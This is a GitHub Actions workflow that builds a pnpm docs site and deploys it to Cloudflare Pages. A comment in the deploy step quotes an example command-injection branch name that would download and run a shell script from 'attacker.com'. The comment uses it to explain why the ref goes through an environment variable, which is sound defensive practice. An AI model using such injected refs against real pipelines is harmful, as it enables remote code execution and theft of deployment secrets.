name: Deploy Docs

on:
  push:
    branches: [main, feat/*, feature/*]
    paths:
      - "docs/**"
  pull_request:
    branches: [main]
    paths:
      - "docs/**"
  workflow_dispatch:

concurrency:
  group: deploy-docs-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read
  deployments: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
      # `cache: pnpm` feature runs `pnpm --version` to compute the cache
      # key, and that fails if pnpm isn't on PATH yet. Modern setup-node
      # (v6 + Node ≥22, which bundles corepack) preserves corepack shims
      # across the Node swap, so running `enable` once up front is
      # sufficient — no need for the second call after setup-node.
      - name: Enable corepack (activates pnpm from packageManager field)
        run: corepack enable

      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6
        with:
          node-version: "22"
          cache: "pnpm"
          cache-dependency-path: docs/pnpm-lock.yaml

      - run: cd docs && pnpm --version && pnpm install --frozen-lockfile

      - run: cd docs && pnpm build

      - name: Deploy to Cloudflare Pages
        if: github.event_name == 'push' || github.event_name == 'workflow_dispatch' || github.event.pull_request.head.repo.full_name == github.repository
        env:
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          # Pass the branch name through an env var so a malicious
          # ref (e.g. evil$(curl attacker.com|sh)) cannot break out of
          # the run-block via shell expansion.  See deploy-web.yml for
          # the same fix; #3938 missed both deploy workflows.
          HEAD_REF: ${{ github.head_ref || github.ref_name }}
        run: npx -y wrangler@4 pages deploy docs/out --project-name=librefang-docs --branch="$HEAD_REF"
